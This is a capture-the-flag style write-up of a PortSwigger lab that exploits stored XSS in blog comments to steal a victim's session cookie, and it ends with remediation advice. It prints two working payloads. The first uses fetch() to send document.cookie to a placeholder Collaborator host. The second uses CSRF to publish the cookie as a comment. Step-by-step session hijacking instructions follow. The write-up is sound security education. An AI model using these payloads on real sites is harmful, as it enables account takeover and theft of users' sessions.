# Exploiting XSS to Steal Cookies

**Lab:** PortSwigger Web Security Academy — Cross-Site Scripting
**Difficulty:** Practitioner
**Category:** Stored XSS (Exploitation)

---

## Problem

The lab's blog comment function contains a stored XSS vulnerability. A simulated victim user automatically views all comments after they are posted — no manual delivery mechanism (like an exploit server link) is needed; simply posting a malicious comment is enough for the simulated victim to encounter and execute it.

The goal is to exploit the vulnerability to exfiltrate the victim's session cookie, then use that stolen cookie to impersonate the victim and access their account.

**Note:** The lab's firewall blocks interactions with arbitrary external systems, so exfiltration must go through **Burp Collaborator's** default public server. An alternative solution exists that doesn't require Collaborator (e.g., directly forcing an account action like an email change), but it is considerably less subtle than genuine cookie exfiltration.

---

## Discovery / Exploitation

1. Confirmed the comment field accepts and stores raw HTML/JavaScript (as established in earlier stored XSS labs on this same application).
2. Obtained a unique Burp Collaborator payload domain via Burp Suite's Collaborator tab ("Copy to clipboard").
3. Since the simulated victim visits the blog post page automatically, no exploit-server delivery step is required — posting the comment directly exposes the payload to the victim the next time the comment is viewed.
4. Used `fetch()` to send the victim's `document.cookie` value to the Collaborator domain as a query parameter, which doesn't require handling any response (the request itself, once logged by Collaborator, is the exfiltration).

---

## Proof of Concept

**Payload posted as a comment:**
```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

**Steps:**
1. In Burp Suite Professional, open the Collaborator tab and click "Copy to clipboard" to obtain a unique Collaborator subdomain.
2. Post the payload above as a blog comment, inserting the copied subdomain, along with the required Name/Email/Website fields.
3. Wait for the simulated victim to view the comments on the blog post (this happens automatically as part of the lab's mechanics — no further action is needed from the attacker).
4. When the victim's browser renders the stored comment, the injected `<script>` executes and issues a `POST` request containing their `document.cookie` as the body, sent to the attacker-controlled Collaborator subdomain.
5. Return to Burp Suite's Collaborator tab and click "Poll now" to check for incoming interactions (wait a few seconds and retry if none appear yet).
6. An HTTP interaction log entry appears; the POST body contains the victim's exfiltrated session cookie value.
7. Using Burp Proxy or Burp Repeater, reload the main blog page while replacing your own session cookie with the captured one, and send the request to solve the lab. To confirm full session hijacking, the same captured cookie can also be used in a request to `/my-account` to load the admin user's account page.

**Alternative solution (noted by PortSwigger, less subtle):** Adapt the attack to make the victim post their own session cookie publicly as a blog comment by exploiting the XSS to perform CSRF — this works without Collaborator, but exposes the cookie publicly in the comment itself and leaves obvious evidence the attack occurred.

**Example alternative payload** (forges a comment-submission request on the victim's behalf, using their own CSRF token, with their session cookie as the comment body):
```javascript
<script>
window.addEventListener('DOMContentLoaded', function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();

    data.append('csrf', token);
    data.append('postId', 3);
    data.append('comment', document.cookie);
    data.append('name', 'victim');
    data.append('email', 'attacker@test.com');
    data.append('website', 'http://xml.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
</script>
```
This reads the victim's own CSRF token from the page, then submits a new comment *as* the victim via CSRF, with the comment body set to `document.cookie` — publishing the victim's session cookie as plain, publicly visible text in a new blog comment, which the attacker can then simply read.

---

## Remediation

- **Fix the underlying stored XSS vulnerability first:** Proper HTML encoding of comment content (as covered in the earlier stored-XSS labs on this same application) is the root-cause fix — none of the cookie-theft steps are possible without the initial unsanitized injection point.
- **Set the `HttpOnly` flag on session cookies:** This is the single most effective mitigation specifically against cookie-theft via XSS. An `HttpOnly` cookie is inaccessible to `document.cookie` in JavaScript entirely, so even a successful XSS injection cannot read or exfiltrate it.
- **Set the `Secure` and `SameSite` flags on session cookies:** `Secure` ensures the cookie is only sent over HTTPS; `SameSite=Strict` or `Lax` limits the cookie being sent in cross-site contexts, adding further defense-in-depth against session-related attacks.
- **Short session lifetimes and IP/device binding:** Even if a session cookie is stolen, a short expiration window and additional binding checks (e.g., flagging a session used from a new IP or device) reduce the window of opportunity and practical impact of a successful theft.
- **This lab's real-world significance:** It demonstrates the full, practical impact of XSS beyond a simple `alert()` proof of concept — converting a client-side script-execution bug into complete account takeover via session hijacking, which is the actual threat model that makes XSS a high-severity vulnerability class in bug bounty and real-world assessments.
